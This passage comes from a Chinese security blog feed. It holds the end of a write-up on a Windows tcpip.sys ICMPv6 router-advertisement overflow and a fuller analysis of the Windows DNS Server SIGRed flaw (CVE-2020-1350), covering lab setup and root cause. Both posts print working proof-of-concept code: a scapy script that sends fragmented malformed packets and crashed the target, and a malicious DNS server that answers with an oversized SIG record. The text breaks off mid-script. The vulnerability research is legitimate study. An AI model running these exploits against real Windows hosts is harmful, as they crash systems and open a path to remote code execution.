TCP/IP堆栈错误地将buffer前进了8个字节。</p><p>这主要是因为堆栈在内部以16字节为增量进行计数，并且没有使用非RFC兼容长度值的处理代码。这种不匹配导致堆栈将当前选项的最后8个字节解释为第二个选项的开始，最终导致缓冲区溢出和潜在的RCE。</p></blockquote><p>而crash原因的是GS机制的Security Cookie校验失败，也就是说要rce需要先搞定GS，我不会，所以受不了放弃了。</p><h2 id="0x04-利用条件"><a href="#0x04-利用条件" class="headerlink" title="0x04 利用条件"></a>0x04 利用条件</h2><ol><li><strong>基本条件</strong><ul><li>attacker需要获取target的IPv6和MAC地址</li></ul></li><li><strong>触发过程</strong><ul><li>attacker需要搭配其他内存泄漏或信息泄漏漏洞来实现RCE</li><li>attacker需要想办法绕过<code>tcpip.sys</code>的GS保护机制</li></ul></li></ol><p>attacker直接发送特制的ICMPv6路由广播数据包给target：</p><h2 id="0x05-poc脚本"><a href="#0x05-poc脚本" class="headerlink" title="0x05 poc脚本"></a>0x05 poc脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> scapy.layers.inet6 <span class="keyword">import</span> ICMPv6NDOptEFA, ICMPv6NDOptRDNSS, ICMPv6ND_RA, IPv6, IPv6ExtHdrFragment, fragment6</span><br><span class="line"> </span><br><span class="line">v6_dst = <span class="string">&quot;target_ipv6&quot;</span><span class="comment">#受害机器的ipv6地址选取 “ipv6地址” 或 “临时ipv6地址”</span></span><br><span class="line">v6_src = <span class="string">&quot;attacker_ipv6&quot;</span><span class="comment">#攻击机的ipv6地址选取 “本地链接的ipv6地址”</span></span><br><span class="line"> </span><br><span class="line">p_test_half = <span class="string">&#x27;A&#x27;</span>.encode()*<span class="number">8</span> + <span class="string">b&quot;\x18\x30&quot;</span> + <span class="string">b&quot;\xFF\x18&quot;</span></span><br><span class="line">p_test = p_test_half + <span class="string">&#x27;A&#x27;</span>.encode()*<span class="number">4</span></span><br><span class="line"> </span><br><span class="line">c = ICMPv6NDOptEFA()</span><br><span class="line"> </span><br><span class="line">e = ICMPv6NDOptRDNSS()</span><br><span class="line">e.<span class="built_in">len</span> = <span class="number">21</span></span><br><span class="line">e.dns = [</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span>,</span><br><span class="line"><span class="string">&quot;AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA&quot;</span> ]</span><br><span class="line"></span><br><span class="line">aaa = ICMPv6NDOptRDNSS()</span><br><span class="line">aaa.<span class="built_in">len</span> = <span class="number">8</span></span><br><span class="line">pkt = ICMPv6ND_RA() / aaa / \</span><br><span class="line">      Raw(load=<span class="string">&#x27;A&#x27;</span>.encode()*<span class="number">16</span>*<span class="number">2</span> + p_test_half + <span class="string">b&quot;\x18\xa0&quot;</span>*<span class="number">6</span>) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e</span><br><span class="line"> </span><br><span class="line">p_test_frag = IPv6(dst=v6_dst, src=v6_src, hlim=<span class="number">255</span>)/ \</span><br><span class="line">              IPv6ExtHdrFragment()/pkt</span><br><span class="line"> </span><br><span class="line">l=fragment6(p_test_frag, <span class="number">200</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> l:</span><br><span class="line">    send(p)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311095109856.png" alt="image-20220311095109856"></p><p>打重启了。。。</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1350漏洞分析与复现</title>
      <link href="/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/03/10/CVE-2020-1350%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2020-1350漏洞分析与复现"><a href="#CVE-2020-1350漏洞分析与复现" class="headerlink" title="CVE-2020-1350漏洞分析与复现"></a>CVE-2020-1350漏洞分析与复现</h1><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220311162152726.png" alt="image-20220311162152726"></p><h2 id="0x01漏洞概述"><a href="#0x01漏洞概述" class="headerlink" title="0x01漏洞概述"></a>0x01漏洞概述</h2><p>​    (CVE-2020-1350) 是 Windows DNS 服务器中的一个严重漏洞，其CVSS得分为10分，通过恶意DNS相应触发后，可以进行提权。</p><h2 id="0x02-DNS协议与攻击流程"><a href="#0x02-DNS协议与攻击流程" class="headerlink" title="0x02 DNS协议与攻击流程"></a>0x02 DNS协议与攻击流程</h2><h3 id="一、关于DNS协议"><a href="#一、关于DNS协议" class="headerlink" title="一、关于DNS协议"></a>一、关于DNS协议</h3><ul><li>DNS 通过 UDP/TCP 端口 53 运行。</li><li>单个 DNS 消息（响应/查询）在 UDP 中限制为 512 个字节，在 TCP 中限制为 65,535 个字节。</li></ul><h3 id="二、Windows中的DNS模块"><a href="#二、Windows中的DNS模块" class="headerlink" title="二、Windows中的DNS模块"></a>二、Windows中的DNS模块</h3><ul><li><strong>DNS客户端</strong>——<em>dnsapi.dll</em>负责DNS解析。</li><li><strong>DNS服务器</strong>——<em>dns.exe</em>负责回答DNS查询。</li></ul><p>我们的研究关键在于对于DNS服务器的攻击，也就是对于<em>dns.exe</em>的分析。</p><h3 id="三、通信流程"><a href="#三、通信流程" class="headerlink" title="三、通信流程"></a>三、通信流程</h3><p>要让被攻击的服务器解析来自我们恶意DNS服务器的响应，需要进行以下的通信流程：</p><ol><li>将<em>我们的域名(evilDomain.com)<em>的NS服务器（名称服务器）配置指向</em>我们的恶意DNS服务器（evilServer.com）</em>;</li><li>向<em>受害DNS服务器</em>发送查询请求，查询目标为*我们的域名(evilDomain.com)*；</li><li><em>受害DNS服务器</em>不知道答案，转发给上层的<em>权威服务器</em>，如<em>谷歌的DNS服务器</em>；</li><li><em>谷歌服务器</em>向受害者响应，告诉受害者<em>我们的恶意DNS服务器（evilServer.com）</em>是我们的*域名(evilDomain.com)*的名称服务器；</li><li>于是<em>受害者DNS服务器</em>储存此信息，然后向我们的恶意服务器<em>（evilServer.com）</em>发送请求；</li><li>我们的恶意服务器进行含有payloads的恶意回复；</li><li><em>受害DNS服务器</em>收到该回复时，在解析的过程中受到攻击</li></ol><p>由于无法在公网上进行实际测试，因此，我们就不进行1、2、3、4步骤，而是直接从第五步开始进行</p><h2 id="0x03-环境配置"><a href="#0x03-环境配置" class="headerlink" title="0x03 环境配置"></a>0x03 环境配置</h2><p>在上述过程中，存在多个主机：</p><p>​    向目标靶服务器<strong>T</strong>发送DNS查询请求的请求者 <strong>A</strong>，请求的内容为域名evil.com对应的服务器 <strong>M</strong>的ip地址，目标靶服务器<strong>T</strong>不知道<strong>M</strong>的ip地址，因此转发给上级权威服务器 <strong>B</strong>，权威服务器返回恶意服务器<strong>N</strong>的地址（这是因为<strong>N</strong>是<strong>M</strong>的名字服务器）。最终，<strong>T</strong>收到<strong>N</strong>的地址，向<strong>N</strong>请求<strong>M</strong>的地址。</p><p>​    虽然看起来有很多主机，但是实际我们需要模拟的只有<strong>A、N、T</strong>三台主机。</p><h3 id="网络配置（NAT）"><a href="#网络配置（NAT）" class="headerlink" title="网络配置（NAT）"></a>网络配置（NAT）</h3><p>需要的环境有：</p><p><em>Windows server 2016</em>——作为被攻击的对象（靶机):</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309151927723.png" alt="image-20220309151927723"></p><p><em>Windows server 2019</em>——作为恶意DNS服务器：</p><p>​    VMware双虚拟机最好采用NAT，同时关闭防火墙；</p><p>​    关闭恶意DNS服务器所在主机的DNS服务，否则影响脚本中的监听服务器。</p><p>安装python 3.9.0</p><h3 id="在Windows-server-2016上配置DNS服务"><a href="#在Windows-server-2016上配置DNS服务" class="headerlink" title="在Windows server 2016上配置DNS服务"></a>在Windows server 2016上配置DNS服务</h3><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308125956554.png" alt="image-20220308125956554"></p><p>​    同时，复现过程还需要采用Windows DNS服务器的条件转发器，略过向权威NS查询的步骤，直接向恶意DNS服务器发出查询。</p><p>在恶意服务器（server2019）配置相关信息：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309170753233.png" alt="image-20220309170753233"></p><p>在靶机上配置条件转发器：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309224643368.png" alt="image-20220309224643368"></p><p>可以证明条件转发器配置正确；</p><p>之后的实验中，由于不需要再使用靶机的dns服务器，为了方便进行脚本的执行，我们将恶意服务器改为kali，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/cve-2020-1350.drawio.png" alt="cve-2020-1350.drawio"></p><h2 id="0x04-漏洞原理分析"><a href="#0x04-漏洞原理分析" class="headerlink" title="0x04 漏洞原理分析"></a>0x04 漏洞原理分析</h2><h3 id="一、函数逻辑分析"><a href="#一、函数逻辑分析" class="headerlink" title="一、函数逻辑分析"></a>一、函数逻辑分析</h3><p>找到checkpoint中提到的漏洞函数<code>SigWireRead()</code>，反汇编后并不长：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308145046333.png" alt="image-20220308145046333"></p><p>关键语句：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308145405637.png" alt="image-20220308145405637"></p><p><code>RR_AllocateEx()</code>用于分配堆内存首个参数为开辟的大小，其计算方式为：</p><p><code>[v10] + [0x14] + [v13[0]]</code></p><p>我们继续步入<code>RR_AllocateEx()</code>函数：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308163625585.png" alt="image-20220308163625585"></p><p>可以看到函数第一个参数大小为int16，因此其最大值为2^16=65,536</p><p>通过汇编验证一下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220308164454709.png" alt="image-20220308164454709"></p><p>可以看到使用的时dx和cx（16位）寄存器的值，而非rdx、rcx。</p><p>因此，若可以使得传入的参数大于65,536，就可以导致整数溢出，然后<code>RR_AllocateEx()</code>函数就会开辟一片很小的空间，而在原函数<code>RR_AllocateEx()</code>中，很快就调用了memcpy函数。</p><p>很大的一块数据放入很小的一片堆内存，我们就可以进行缓冲区溢出攻击了。</p><h3 id="二、DNS协议流程分析"><a href="#二、DNS协议流程分析" class="headerlink" title="二、DNS协议流程分析"></a>二、DNS协议流程分析</h3><p>因此，现在首先要确定传入<code>RR_AllocateEx()</code>的第一个参数是否可能达成溢出。</p><p>​    回到<code>SigWireRead()</code>函数：<code>[v10] + [0x14] + [v13[0]]</code>的值由两个变量和一个常量组成，其本质为：<code>[Name_PacketNameToCountNameEx result] + [0x14] + [The Signature field’s length (rdi–rax)]</code>；</p><p>​    要利用这个数达成溢出，我们能够改变的只有[The Signature field’s length (rdi–rax)]，也就是签名字段的长度，那么我们就需要从DNS协议流程的角度分析，这个值是否能够人为改变呢。</p><h4 id="DNS包总结构："><a href="#DNS包总结构：" class="headerlink" title="DNS包总结构："></a>DNS包总结构：</h4><table><thead><tr><th>区域名称:</th><th>区域内容:</th></tr></thead><tbody><tr><td>Header</td><td>消息头部</td></tr><tr><td>Question</td><td>DNS请求</td></tr><tr><td>Answer</td><td>回答请求的资源记录（Resource Record(s)）</td></tr><tr><td>Authority</td><td>指向域的资源记录</td></tr><tr><td>Additional</td><td>其他资源记录</td></tr></tbody></table><h5 id="Header"><a href="#Header" class="headerlink" title="Header:"></a>Header:</h5><p>​    固定为12 字节，同一个查询和响应的 ID 是一样的，QR 指明当前是查询还是响应，OPCODE 指明是用标准查询还是反向查询，<strong>TC 表示UDP长度大于 512 时截断并用 TCP 再次请求</strong>，QDCOUNT 表示查询的数量，ANCOUNT 表示响应的数量。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02194631-b2a0d6c247a547c9955b91dd1b5ebe29.x-png" alt="img"></p><h5 id="Question："><a href="#Question：" class="headerlink" title="Question："></a>Question：</h5><p>​    主要由被查询的域名、查询类型和查询类组成，其中请求的域名中没有“.”，域名中的“.”被编码为元信息，指示接下来的多少字节是有效信息，试举一例：</p><p>​    我要请求<a href="http://www.google.com.hk/">www.google.com.hk</a>的A记录。</p><p>其中的QNAME段是：<em>03</em> 77 77 77 <em>06</em> 67 6f 6f 67 6c 65 <em>03</em> 63 6f 6d <em>02</em> 68 6b <em>00</em></p><p>其中斜体的就是所谓的元信息！（注意需要以0x00作为结尾）</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02203442-4a6d8a568f584f6092d87f32a041dbe3.x-png" alt="img"></p><h5 id="Answer："><a href="#Answer：" class="headerlink" title="Answer："></a>Answer：</h5><p>​    响应部分，以及其他两部分，其结构都如下所示，其中NAME字段为域名，依然可以使用上文中提到的元信息表示法，但是存在另一种方法，即<strong>偏移表示法（域名压缩）</strong>。</p><p>​    域名压缩本意是为了解决dns报文中多次提到域名，浪费空间，就使用较短的表示方法表示域名：</p><p>压缩方法很简单，当一个域名中的标识符是压缩的，它的“计数”字节中的最高两位将被设置为11。这表示它是一个16 bit指针而不再是8 bit的计数字节。指针中的剩下14 bit表示该标识符在DNS报文中所在的位置偏移（<strong>相对于DNS报文头</strong>）。注意一个指针可能指向一个完整的域名，也可能只指向域名的结尾部分，并且一个域名也可以前半部分不压缩，仅对后半部分才应用指针压缩。此外嵌套压缩也是存在的，即指针指向的域名也可能是压缩的（包含一个指针）。</p><p>举个例子：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/879291_BK62PXN5P34V87F.png" alt="img"></p><p>（图片源自<a href="https://bbs.pediy.com/thread-260712.htm%EF%BC%89">https://bbs.pediy.com/thread-260712.htm）</a></p><p>​    图中蓝色的<code>C0 0C</code>部分就表示了一个压缩地址，转化为二进制后，除去两bit的1位置，剩下的表示偏移为C，表示相对报头的偏移为c。</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/02205855-a75a3b78ceea48b380c206f9efe280a8.x-png" alt="img"></p><h4 id="sig类型数据包"><a href="#sig类型数据包" class="headerlink" title="sig类型数据包"></a>sig类型数据包</h4><p>​    在上文中提到的question部分中，第二个字段是Qtype，表示了包的种类。为了触发漏洞，只有发送sig类型的数据包，才会调用<code>SigWireRead()</code>函数，进而才有可能利用漏洞！这部分对sig数据包做说明（其实就是上文响应区的RDATA字段。</p><p>维基百科：</p><table><thead><tr><th>SIG</th><th>24</th><th>RFC 2535</th><th>Signature</th><th>Signature record used in SIG(0) (RFC 2931) and TKEY (RFC 2930).[<a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types#cite_note-rfc3755_sec3-7">7]</a> RFC 3755 designated RRSIG as the replacement for SIG for use within DNSSEC.[<a href="https://en.wikipedia.org/wiki/List_of_DNS_record_types#cite_note-rfc3755_sec3-7">7]</a></th></tr></thead></table><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/640" alt="图片"></p><p>各个字段的含义：</p><ul><li>type covered(2 octet): RRs的类型</li><li>algorithm(1 octet)：签名算法</li><li>labels(1 octet)：域名通配规则</li><li>original TTL(4 octet)：受签名保护的TTL</li><li>signature expiration(4 octet)：签名有效的起始时间</li><li>signature inception(4 octet)：签名有效的截至时间</li><li>key tag(2 octet)：公钥模数或RR的简单校验和</li><li>signer’s name：签名者的域名，可被压缩</li><li>signature：签名数据序列</li></ul><p>至此，已经完全的学习了利用此漏洞需要的背景知识，按照我们现在已有的信息，我们可以开始尝试漏洞利用。</p><h2 id="0x05-POC使用"><a href="#0x05-POC使用" class="headerlink" title="0x05 POC使用"></a>0x05 POC使用</h2><h3 id="一、数据构造原理"><a href="#一、数据构造原理" class="headerlink" title="一、数据构造原理"></a>一、数据构造原理</h3><p>在本部分中，我们参考<a href="*https://github.com/maxpl0it/CVE-2020-1350-DoS*">maxpl0it</a>的POC进行分析：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220309134148733.png" alt="image-20220309134148733"></p><p>​    再次分析函数流程，先用<code>Name_PacketNameToCountNameEx()</code>计算原域名的长度，返回值用v8接到，v13 为 SIG中的 signature 长度，v10 为 SIG中 signer’s name 需要分配的空间。</p><p>​    即：v13 = 0xffff<em>（TCP包总长度）</em> - 12<em>（包头）</em> - len(queries)<em>（问题部分长度）</em>- 20<em>（0x14）</em><br>​            v10 = 源域名长度-当前域名长度（理应是同一个） = 0</p><p>这样一来，<code>v13+v10+0x14</code>就一定小于<code>0xffff</code></p><p>​    但是，我们可以通过上文中提到的域名压缩对v10的值进行人为干涉，让其指向我们可控长度的构造域名字段，从而更改v10的值。</p><h3 id="二、checkpoint-POC构造分析"><a href="#二、checkpoint-POC构造分析" class="headerlink" title="二、checkpoint POC构造分析"></a>二、checkpoint POC构造分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">domain = <span class="literal">None</span></span><br><span class="line">domain_compressed = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>():</span></span><br><span class="line"><span class="keyword">global</span> domain_compressed</span><br><span class="line"><span class="comment"># Setup</span></span><br><span class="line">domain_split = [<span class="built_in">chr</span>(<span class="built_in">len</span>(i)) + i <span class="keyword">for</span> i <span class="keyword">in</span> domain.split(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">domain_compressed = <span class="string">&quot;&quot;</span>.join(domain_split) + <span class="string">&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The TCP port is contacted second</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">sock.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">53</span>))</span><br><span class="line">sock.listen(<span class="number">50</span>)</span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">connection, client_address = sock.accept()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Received TCP Connection&quot;</span>)</span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Contents</span></span><br><span class="line">sig = <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Type covered</span></span><br><span class="line">sig += <span class="string">&quot;\x05&quot;</span> <span class="comment"># Algorithm - RSA/SHA1</span></span><br><span class="line">sig += <span class="string">&quot;\x00&quot;</span> <span class="comment"># Labels</span></span><br><span class="line">sig += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">sig += <span class="string">&quot;\x68\x76\xa2\x1f&quot;</span> <span class="comment"># Signature Expiration</span></span><br><span class="line">sig += <span class="string">&quot;\x5d\x2c\xca\x1f&quot;</span> <span class="comment"># Signature Inception</span></span><br><span class="line">sig += <span class="string">&quot;\x9e\x04&quot;</span> <span class="comment"># Key Tag</span></span><br><span class="line">sig += <span class="string">&quot;\xc0\x0d&quot;</span> <span class="comment"># Signers Name - Points to the &#x27;9&#x27; in 9.domain.</span></span><br><span class="line">sig += (<span class="string">&quot;\x00&quot;</span>*(<span class="number">19</span> - <span class="built_in">len</span>(domain)) + (<span class="string">&quot;\x0f&quot;</span> + <span class="string">&quot;\xff&quot;</span>*<span class="number">15</span>)*<span class="number">5</span>).ljust(<span class="number">65465</span> - <span class="built_in">len</span>(domain_compressed), <span class="string">&quot;\x00&quot;</span>) <span class="comment"># Signature - Here be overflows!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SIG Header</span></span><br><span class="line">hdr = <span class="string">&quot;\xc0\x0c&quot;</span> <span class="comment"># Points to &quot;9.domain&quot;</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line">hdr += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># TTL</span></span><br><span class="line">hdr += struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, <span class="built_in">len</span>(sig)) <span class="comment"># Data Length</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DNS Header</span></span><br><span class="line">response = <span class="string">&quot;\x81\xa0&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name (9.domain)</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">data += connection.recv(<span class="number">65535</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line">len_msg = <span class="built_in">len</span>(response + hdr + sig) + <span class="number">2</span> <span class="comment"># +2 for the transaction ID</span></span><br><span class="line"><span class="comment"># Msg Size + Transaction ID + DNS Headers + Answer Headers + Answer (Signature)</span></span><br><span class="line">connection.sendall(struct.pack(<span class="string">&#x27;&gt;H&#x27;</span>, len_msg) + data[<span class="number">2</span>:<span class="number">4</span>] + response + hdr + sig)</span><br><span class="line">connection.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># The UDP server is contacted first</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">udp_server</span>():</span></span><br><span class="line">sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">server_address = <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">server_port = <span class="number">53</span></span><br><span class="line">response = <span class="string">&quot;\x83\x80&quot;</span> <span class="comment"># Flags: Response + Truncated + Recursion Desired + Recursion Available</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Questions</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Answer RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Authority RRs</span></span><br><span class="line">response += <span class="string">&quot;\x00\x00&quot;</span> <span class="comment"># Additional RRs</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Queries</span></span><br><span class="line">response += <span class="string">&quot;\x019&quot;</span> + domain_compressed <span class="comment"># Name</span></span><br><span class="line">response += <span class="string">&quot;\x00\x18&quot;</span> <span class="comment"># Type: SIG</span></span><br><span class="line">response += <span class="string">&quot;\x00\x01&quot;</span> <span class="comment"># Class: IN</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Data</span></span><br><span class="line">data = <span class="string">&quot;\x03ns1\xc0\x0c&quot;</span> <span class="comment"># ns1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">data += <span class="string">&quot;\x03ms1\xc0\x0c&quot;</span> <span class="comment"># ms1 + pointer to 4.ibrokethe.net</span></span><br><span class="line">data += <span class="string">&quot;\x0b\xff\xb4\x5f&quot;</span> <span class="comment"># Serial Number</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x0e\x10&quot;</span> <span class="comment"># Refresh Interval</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x2a\x30&quot;</span> <span class="comment"># Response Interval</span></span><br><span class="line">data += <span class="string">&quot;\x00\x01\x51\x80&quot;</span> <span class="comment"># Expiration Limit</span></span><br><span class="line">data += <span class="string">&quot;\x00\x00\x00\x20&quot;</span> <span class="comment"># Minimum TTL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Authoritative Nameservers</span></span><br><span class="line">response += <span 